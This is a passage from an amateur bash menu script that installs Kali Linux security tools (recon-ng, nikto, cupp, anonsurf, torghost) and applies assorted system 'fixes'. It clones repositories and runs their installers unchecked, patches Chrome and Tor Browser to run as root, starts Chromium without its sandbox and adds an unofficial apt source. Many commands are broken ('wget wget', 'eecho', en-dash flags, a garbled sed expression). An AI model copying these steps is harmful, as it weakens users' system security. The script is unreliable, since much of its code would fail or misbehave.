sleep 1
clear
echo
echo
echo "======install recon-ng for you======"
sleep 4
echo "[*]working........"
sleep 1
git clone https://bitbucket.org/LaNMaSteR53/recon-ng
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 9 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install maltegoce for you======"
sleep 4
echo "[*]working........"
sleep 1
sudo apt-get -y install maltegoce 
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 10 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install nikto for you======"
sleep 4
echo "[*]working........"
sleep 1
sudo apt-get -y install nikto 
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 11 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install sparta for you======"
sleep 4
echo "[*]working........"
sleep 1
sudo apt-get -y install sparta 
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 12 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=======install operative-framework for you======="
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/graniet/operative-framework.git
cd operative-framework/
chmod +x requirements.txt
pip install -r requirements.txt
echo $GREEN"Finishing....."
sleep 7
clear
cd ..
./DHH.sh
else
if [ $co = 13 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========== install AngryFuzzer for you =========="
sleep 4
echo "[*]working..........."
sleep 1
git clone https://github.com/ihebski/angryFuzzer.git
cd angryFuzzer/
chmod +x requirements.txt
pip install -r requirements.txt
echo $GREEN"Finishing....."
sleep 7
clear
cd ..
./DHH.sh
else
if [ $co = 14 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "============ Install recon-dog for you =============="
sleep 4
echo "[*]working.........."
sleep 1
git clone https://github.com/UltimateHackers/ReconDog
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 15 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 14  ];then
clear
echo
echo
echo
echo
echo ""
echo     "    *       word list tools menu          *"
echo $RED"    *-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=*"
echo "    *  1 . install wordlestgen            *"
echo "    *  2 . install cupp                   *"
echo "    *  3 . install wlm                    *"  
echo "    *  4 . install pack                   *"                
echo "    *  5 . back to menu                   *"
echo     "    *-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*"
echo ""$GREEN
echo -n "Enter choice ->> "$BLUE
read sda
echo
if [[ $sda == '' ]];then
clear
./DHH.sh
else
if [ $sda = 1 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install wordlestgen for you============"
sleep 4
echo "[*]working........"
sleep 1
git clone https://www.github.com/Oseid/WordLsGen.git
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $sda = 2 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install CUPP for you============"
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/Mebus/cupp.git
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $sda = 3 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN [ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install wlm for you============"
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/adaywithtape/wlm.git
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $sda = 4 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install pack for you======="
sleep 4
echo "[*]working........."
sleep 1
git clone https://github.com/iphelix/pack.git
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $sda = 5 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
else
if [ $word = 15 ];then 

#fix armi

function FixArm {
        clear
	echo "" $GREEN
	echo  -n "Do you want to fix ARMITAGE $RED  ? $BLUE [Y/N] :> $RED"
			read install
			if [[ $install = Y || $install = y ]] ; then
                                clear
                                echo
                              echo
                             echo $RED"============= Fixing Armirage for you ============="
sleep 4
echo "[*]working..........."
sleep 1
clear
service postgresql restart
msfdb init
echo
sleep 3
echo "$BLUE[*]$RED:${GREEN}Done your Armitage Has Been Fix Now "
echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
else
if [[ $install = N || $install = n ]] ; then
clear
fi
fi

}
     
#fix vm

function Fixvmware {
        clear
	echo "" $GREEN
	echo  -n "Do you want to fix VMware $RED  ? $BLUE [Y/N] :> $RED"
			read install
			if [[ $install = Y || $install = y ]] ; then
                                clear
                                echo
                                echo	
				echo $RED"=========== Fixing VMWare for you ============="
				sleep 4
                                echo "[*]working............"
                                sleep 1
				cd /usr/lib/vmware/modules/source
 				tar -xvf vmnet.tar			
				mv vmnet-only/netif.c vmnet-only/netif.txt
				sed -i 's/`dev = alloc_netdev(sizeof *netIf, deviceName, VNetNetIfSetup)" -eq dev = alloc_netdev(sizeof *netIf, deviceName, NET_NAME_UNKNOWN, VNetNetIfSetup)/g' vmnet-only/netif.txt
				mv vmnet-only/netif.txt vmnet-only/netif.c	
				tar -cvf vmnet.tar vmnet-only/
				rm -rf vmnet-only/
			        echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear

			else
				if [[ $install = N || $install = n ]];then
                                clear
                        fi
			fi
}

#fix sound

function Fixsound {
        clear
	echo
	echo "" $GREEN
	echo -n "Do you want to install alsa-utils to fix sound ? $GREEN [Y/N] :> $RED"
			read install
			if [[ $install = Y || $install = y ]] ; then
                        clear
                        echo
echo "checking $RED[internet]$BLUE connections$RED........"
                        echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again  :) " 
echo
exit
fi	
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo $BLUE"====== Fixing sound mute for you ======"
				sleep 4
                                echo "[*]working........."
                                sleep 1
				apt-get -y install alsa-utils &>/dev/null
			        echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                
			else
				if [[ $install = N || $install = n ]];then
                                clear
                                
                        fi
			fi

}

######## Fix VLC
function FixVlc {
clear
	echo    "" $GREEN
        echo
	echo -n "Do you want fix VLC $RED ? $GREEN [Y/N] :> $RED"
			read install
			if [[ $install = Y || $install = y ]] ; then	
                                clear
                                echo
                                echo
				echo $BLUE"======== Fixing VLC for you ========="
				sleep 2
				sed -i 's/geteuid/getppid/g' /usr/bin/vlc				
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                
			else
				if [[ $install = N || $install = n ]];then
                                clear
                                
                        fi
			fi
}

######## Install fix device
function Fixdevice {
clear
	echo ""
        echo
	echo $BLUE "Do you want fix device ? $GREEN [Y/N] : "$RED
			read install
			if [[ $install = Y || $install = y ]] ; then	
                                clear
                                echo
                                echo
				echo $BLUE"========== Fixing Device for you =========="$RED
				sleep 4
                                echo "[*]working..........."
                                sleep 1
				mv /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.txt
				sed -i 's/false/true/g' /etc/NetworkManager/NetworkManager.txt
				mv /etc/NetworkManager/NetworkManager.txt /etc/NetworkManager/NetworkManager.conf
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                

			else

       			 if [[ $install = N || $install = n ]];then
                                clear
                                
                        fi
			fi
}

# Fix audio 
function fixonadio {
clear
echo "" $GREEN
echo    echo -n "Do you want fix audio ? [Y/N] :> $RED"
        read swad
        if [[ $swad = Y || $swad = y ]];then
        clear
        echo
        echo
	echo -e "Trying to get you some audio..."
	sleep 2
	clear
	echo -e $GREEN"Press "$BLUE"y"$RED" if/when prompted"
	sleep 3
	clear
	echo -e "Installing pulseaudio......."
	sleep 1
	apt-get pulseaudio
	echo -e "Enabling pulseaudio......."
	sleep 1
	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
	clear
	echo -e "Done!"
	sleep 1
	clear
	echo -e "I mean...Try to see if you have audio."
	sleep 3
	echo -e " "
	echo -e "That's all i can do :/"
	sleep 2
	echo -e " "
	echo -e "If it wasn't fix , then try rebooting"
 else
        if [[ $swad = N || $swad = n ]];then
        clear
        

       fi
       fi
}

#Fix no outout
function fixnou {
clear
echo
echo "" $GREEN
                     echo -n "Do you want fix wash tool ?$BLUE [Y/N] : $RED"
                     read ch
                     if [[ $ch = Y || $ch = y ]];then
                     clear
                     echo
                     echo
	             echo -e "Ok...Lets try to fix wash tool..."
	             sleep 1
                     echo
	             mkdir /etc/reaver
                     sleep 3
	             echo -e "Done wash tool now fixd!."
               else
                     if [[ $ch = N || $ch = n ]];then
                     clear
                     

                 fi
                 fi

}

#Fix full screen

function full {
clear
echo
echo "" $BLUE

                        echo -n "Do you want to fix problem no full screen $RED ? $GREEN [Y/N] : $RED "
			read install
			if [[ $install = Y || $install = y ]] ; then
                        clear
                        echo
echo "checking $RED[internet]$BLUE connections$RED........"
                        echo	

  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo $BLUE"======== Fixing start for you========="
				sleep 2
				sudo apt-get -y install open-vm-tools-desktop fuse				
			        echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                
			else
			if [[ $install = N || $install = n ]];then
                        clear
                        
                        fi
			fi
}

#fixsound in kali
function fixss {
clear
echo
echo "" $BLUE
echo -n "Do you want to fix sound ?$RED [Y/N] : $RED"
			read install
			if [[ $install = Y || $install = y ]] ; then
                        clear
                        echo
                        echo	
				echo $RED "====== Fixing Sound for you ======"
				sleep 2
				systemctl --user enable pulseaudio
				systemctl --user start pulseaudio
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                

		else

			if [[ $install = N || $install = n ]];then
                        clear
                        
	
			fi
                        fi


}

function fixf {
clear
echo
echo ""$GREEN
	echo -n "Do you want fix font square in kali linux $RED? [Y/N] :$BLUE"
			read install
			if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo	
				echo $RED "====== Fixing font square ======"
				sleep 4
 				echo "[*]working.........."
				sleep 1
				apt --reinstall --force-yes install fonts-cantarell 
				echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
			else
				if [[ $install = Y || $install = y ]] ; then
				clear
   			fi
			fi


}



function fcr {
clear
echo
echo ""$GREEN 
	echo -n "Do you want fix ( when press yes you just run chrome with gksu -u chromeuser google-chrome  $RED? [Y/N] :$BLUE "
			read install
			if [[ $install = Y || $install = y ]] ; then	
			        echo "=========== Fixing chrome for you ==========="
				sleep 4
                                echo "[*]working..........."
                                sleep 1
				clear
				useradd  -m chromeuser
				clear
                            	echo $GREEN"[*]Finishing....."
                        	sleep 7
                                clear
				
			else
				if [[ $install = N || $install = n ]] ; then
clear
                        fi
			fi

}

function fch {
clear
echo
echo "" $GREEN
	echo -n "Do you want to  run chromium with fix ? [Y/N] : $RED"
			read install
				if [[ $install = Y || $install = y ]] ; then	
			echo "[*]working............."
			sleep 4
			chromium --user-data-dir --no-sandbox 
		        echo $GREEN"[*]Finishing....."
                        sleep 7
                                clear

			else
		        	 if [[ $install = N || $install = n ]] ; then
				clear
			fi			
			fi
}

	

function Fix {
clear
echo
echo
echo 
echo ""
echo $GREEN
echo "============================================================================================"
echo "                              I LOVE KALI LINUX !                                 "
echo "                                                                                  "$RED
echo "                                                   Let's Help Kali LINUX !        "
echo " _______  ___   __   __  ___   __    _  _______                                   "   
echo "|       ||   | |  |_|  ||   | |  |  | ||       |                                  "
echo "|    ___||   | |       ||   | |   |_| ||    ___|                                  "
echo "|   |___ |   | |       ||   | |       ||   | __                                   "
echo "|    ___||   |  |     | |   | |  _    ||   ||  |                                  "
echo "|   |    |   | |   _   ||   | | | |   ||   |_| |                                  "
echo "|___|    |___| |__| |__||___| |_|  |__||_______|>>fix problems                    " 
echo "                                                                                  "$GREEN
echo "============================================================================================"$BLUE
echo "                  Let's help kali linux   :)                                      "$GREEN
echo "============================================================================================"$BLUE   
echo ""                                                                   
select menusel in "Fix sound in kali linux" "Fix Sound Mute" "Fix VLC" "Fix vmware" "Fix Device not managed error" "Fix Font Square" "Fix Chrome not open" "Fix Chromium not Open " "Fix no audio issue" "Fix No output in wash tool" "Fix No full screen" "Fix Armitage not Open" "Exit"; do
case $menusel in 
        "Fix vmware")
                 Fixvmware
                 clear ;;
        "Fix Sound Mute")
                 Fixsound 
                 clear ;;
        "Fix sound in kali linux")
                 fixss
                 clear ;;
        "Fix VLC")
                 FixVlc
                 clear ;;
        "Fix Device not managed error")
                 Fixdevice          
                 clear ;;
        "Fix Font Square")
                 fixf
                 clear ;;
        "Fix Chrome not open")
                 fcr
                 clear ;;
        "Fix Chromium not Open ")
                 fch
                 clear ;;
        "Fix no audio issue")
                 fixonadio
                 clear ;;   
        "Fix No output in wash tool")
                 fixnou
                 clear ;;
        "Fix No full screen")
                 full
                 clear ;;
        "Fix Armitage not Open")
                FixArm
                clear ;;
 
        "Exit")                  
  	clear && exit 2 ;;
		
	* ) echo "$RED[x]$BLUE The error of your choice does not exist";sleep 2;
		screwup
		clear ;;


esac

break

done
}
while true; do Fix; done

else

if [ $word = 16 ];then

function gchrome {
clear
echo
echo "" $GREEN
	
	echo -n "Do you want to install Google Chrome Latest Version  ?$BLUE [Y/N] $RED: "
	read install
	if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
			read -p "Are you using a 32bit or 64bit operating system [ENTER: 32 or 64]? " operatingsys
			if [ "$operatingsys" == "32" ]; then 
clear
echo
echo
				echo $RED "==============install Google Chrome [32 bit] for you============"
sleep 4
echo "[*]working........"
sleep 1
				wget wget https://dl.google.com/linux/direct/google-chrome-stable_current_i386.deb
				echo -e "\e[32m[-] Done with download!\e[0m"
				echo -e "\e[1;31m[+] Installing google-chrome\e[0m"
				dpkg -i google-chrome-stable_current_i386.deb
				cp /opt/google/chrome/google-chrome.desktop /usr/share/applications/google-chrome.desktop
				echo -e "\e[1;31m[+] Patching to run as root!\e[0m"
				head -n -1 /opt/google/chrome/google-chrome > temp.txt ; mv temp.txt /opt/google/chrome/google-chrome
				echo 'exec -a "$0" "$HERE/chrome"  "$@" --user-data-dir' >> /opt/google/chrome/google-chrome
				chmod +x /opt/google/chrome/google-chrome
				echo -e "\e[32m[-] Done patching!\e[0m"
				rm google-chrome-stable_current_i386.deb
				echo $BLUE"Done google chrome has been install on your OS "
			else
clear
echo
echo
				echo $RED "==============install Google Chrome [32 bit] for you============ "
sleep 4
echo "[*]working......."
sleep 1
				wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
				echo -e "\e[32m[-] Done with download!\e[0m"
				echo -e "\e[1;31m[+] Installing google-chrome\e[0m"
				dpkg -i google-chrome-stable_current_amd64.deb
				cp /opt/google/chrome/google-chrome.desktop /usr/share/applications/google-chrome.desktop
				echo -e "\e[1;31m[+] Patching to run as root!\e[0m"
				head -n -1 /opt/google/chrome/google-chrome > temp.txt ; mv temp.txt /opt/google/chrome/google-chrome
				echo 'exec -a "$0" "$HERE/chrome"  "$@" --user-data-dir' >> /opt/google/chrome/google-chrome
				chmod +x /opt/google/chrome/google-chrome
				echo -e "\e[32m[-] Done patching!\e[0m"
				rm google-chrome-stable_current_amd64.deb
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                
				

			fi
		else
                        if [[ $install = N || $install = n ]];then
                        clear
                        
			
		fi
                fi

}

function gchromium {
	clear
echo
echo
	echo "" $GREEN
	
	echo -n "Do you want to install it ?$RED [Y/N] :> $BLUE "
			read install
			   if [[ $install = Y || $install = y ]] ; then	
                                clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
                                sudo apt-get -y update
				echo $RED "=========================== Install Chromium for you ==============================="
				sleep 2
				apt-get --force-yes install Chromium 		
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                
						

			else
				
                           if [[ $install = N || $install = n ]];then
                           clear
                           
			fi
                        fi

}

function gfox {

	clear
        echo
echo "" $GREEN
echo -n "Do you want install firefox $RED?$BLUE [Y/N] : "$RED
read install
			if [[ $install = Y || $install = y ]] ; then	
                        clear
                        echo
echo "checking $RED[internet]$BLUE connections$RED........"
                        echo
            ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3

                        clear
                        echo
                        echo
                        echo $GREEN"[!]you not connect to the internet ! "$BLUE
                        echo
                        echo "[!]please Connect to the internet and try again :) " 
                        echo
                        exit

          fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
			echo $RED"=============================== Install firefox for you ============================"
			sleep 4
                        echo "[*]working........."
                        sleep 1
                                    
				apt-get -y remove iceweasel
				echo -e deb http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt all main | tee -a /etc/apt/sources.list > /dev/null
				apt-key adv –recv-keys –keyserver keyserver.ubuntu.com C1289A29
				apt-get -y update
				apt-get --force-yes install firefox-mozilla-build				
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                
				
			else
				if [[ $install = N || $install = n ]];then
                                clear
                               
			fi
                        fi
}
	
function gtor32 {
if [ ! -f /root/tor-browser_en-US/Browser/start_tor_browser ]; then
	echo ""
clear
echo
echo
echo "" $GREEN
echo -n "Do you want install Tor Browser 32 $RED?$BLUE [Y/N] : "$RED
read install
			if [[ $install = Y || $install = y ]] ; then
                                clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
                                echo	
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo $RED"====== Installing Tor Browser 32 bit ======"
                                sleep 4
                                echo "[*]working........."
                                sleep 1

				sleep
				cd /root/Desktop
				wget https://www.torproject.org/dist/torbrowser/6.0.5/tor-browser-linux32-6.0.5_en-US.tar.xz
				tar -xf tor-browser-linux32-6.0.5_en-US.tar.xz
				cd /root/Desktop/tor-browser_en-US/Browser/
				mv start-tor-browser start-tor-browser.txt
				sed -i 's/`id -u`" -eq 0/`id -u`" -eq 1/g' start-tor-browser.txt
				mv start-tor-browser.txt start-tor-browser
				cd ..
				ls -ld
				chown -R root:root .
				ls -ld
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                

			else
			       if [[ $install = N || $install = n  ]];then
                               clear
                               
			fi
                        fi
	else
		echo $GREEN"[-] Tor Browser already installed !"
	fi
}

function gtor64 {
clear
if [ ! -f /root/tor-browser_en-US/Browser/start_tor_browser ]; then
	echo ""$GREEN
clear
echo
echo
	echo "" $GREEN
echo -n "Do you want install Tor Browser 64bit $RED?$BLUE [Y/N] : "$RED
read install
			if [[ $install = Y || $install = y ]] ; then	
                        clear
                        echo 
echo "checking $RED[internet]$BLUE connections$RED........"
                        echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN [ CONNECT ]"
sleep 1
clear
echo
echo
				echo $GREEN "====== Install Tor Browser 64bit for you ======"
                                sleep 4
                                echo "[*]working......"
                                sleep 1

				cd /root/Desktop
				wget https://www.torproject.org/dist/torbrowser/6.0.5/tor-browser-linux64-6.0.5_en-US.tar.xz
				tar -xf tor-browser-linux64-6.0.5_en-US.tar.xz
				cd /root/Desktop/tor-browser_en-US/Browser/
				mv start-tor-browser start-tor-browser.txt
				sed -i 's/`id -u`" -eq 0/`id -u`" -eq 1/g' start-tor-browser.txt
				mv start-tor-browser.txt start-tor-browser
				cd ..
				ls -ld
				chown -R root:root .
				ls -ld
                                echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                

			else
				if [[ $install = N || $install = n ]];then
                                clear
                                
			fi
                        fi
	else
		echo -e "\e[32m[-] Tor Browser already installed !\e[0m"
	fi
}


######## BROWSERS MENU ##############
function browser {
clear
echo
echo
echo -e $GREEN"======================================================================="
echo -e $RED"                                                                         "
echo -e $BLUE"                                                                        "
echo -e $RED"	____________ _____ _    _ _____ ___________  _____ "
echo "	| ___ \ ___ \  _  | |  | /  ___|  ___| ___ \/  ___|"
echo "	| |_/ / |_/ / | | | |  | \ \`--.| |__ | |_/ /\ \`--. "
echo "	| ___ \    /| | | | |/\| |\`--. \  __||    /  \`--. "
echo "	| |_/ / |\ \\ \_/ |  /\  /\__/ / |___| |\ \ /\__/ /"
echo "	\____/\_| \_|\___/ \/  \/\____/\____/\_| \_|\____/ "
echo
echo -e $GREEN"======================================================================="
echo -e $BLUE	" 		Let's Intall  and chocie your fav browser  "
echo -e $GREEN"======================================================================="
echo "                                                                "
echo -e $BLUE""
select broselc in "Install Google Chrome" "Install Chromium" "Install Firefox" "Install Min" "Install TOR-32bit" "Install TOR-64bit" "Install firefox security" "Exit"; do
case $broselc in
	"Install Google Chrome")
		gchrome
		clear ;;
	"Install Chromium")
		gchromium
		clear ;;
	"Install Firefox")
		gfox
                clear ;;	
	"Install Min")
		firefox https://minbrowser.github.io/min/
		firefox http://www.linuxsec.org/2016/06/min-web-browser.html
		clear ;;	
	"Install TOR-32bit")
		gtor32
		clear ;;
	"Install TOR-64bit")
		gtor64
                clear ;;
        "Install firefox security")
                clear
                ./firefox-security.sh run
                clear ;;
	"Exit")
	  	clear && exit 0 ;;
		
		
	* ) echo "$RED[x]$BLUE The error of your choice does not exist";sleep 2;

		screwup
		clear ;;

esac

break

done
}
while true; do browser; done

else
if [ $word = 17 ];then
clear
echo
echo
function anonsurf {
clear
echo
echo
echo "" $GREEN
echo -n "Do you want install anonsurf $RED?$BLUE [Y/N] : "$RED
read install
if [[ $install = Y || $install = y ]];then
clear
echo 
eecho "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*]$GREEN [ CONNECT ]"
sleep 1
clear
echo
echo
echo "========== install anonsurf for you ==========="
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/Und3rf10w/kali-anonsurf.git
		cd kali-anonsurf
		chmod +x installer.sh
		./installer.sh
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $install = N || $install = n ]];then
clear
fi
fi

}

function anonym8 {
clear
echo
echo
echo "" $GREEN
echo -n "Do you want install anonym8 $RED?$BLUE [Y/N] : "$RED
read install
if [[ $install = Y || $install = y ]];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE [*]$GREEN [ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========== install anonym8 for you ==========="
sleep 4
echo "[*]working........."
sleep 1
git clone https://github.com/HiroshiManRise/anonym8.git
		cd anonym8
		chmod +x INSTALL.sh
		./INSTALL.sh
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $install = N || $install = n ]];then
clear
fi
fi
}

function torghost {
clear
echo
echo
echo "" $GREEN
echo -n "Do you want install 4nonimizer $RED?$BLUE [Y/N] : "$RED
read install
if [[ $install = Y || $install = y ]];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*]$GREEN [ CONNECT ]"
sleep 1
clear
echo
echo
echo "============ install TorGhost for you ============="
sleep 4
echo "[*]working..........."
sleep 1
git clone https://github.com/susmithHCK/torghost.git
cd torghost/
chmod +x install.sh
./install.sh
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $install = N || $install = n ]];then 
clear
fi
fi

}

function non {
clear
echo
echo "" $GREEN
echo -n "Do you want install 4nonimizer $RED?$BLUE [Y/N] : "$RED
read install
if [[ $install = Y || $install = y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========== install 4nonimizer for you ==========="
sleep 4
echo "[*]working........."
sleep 1
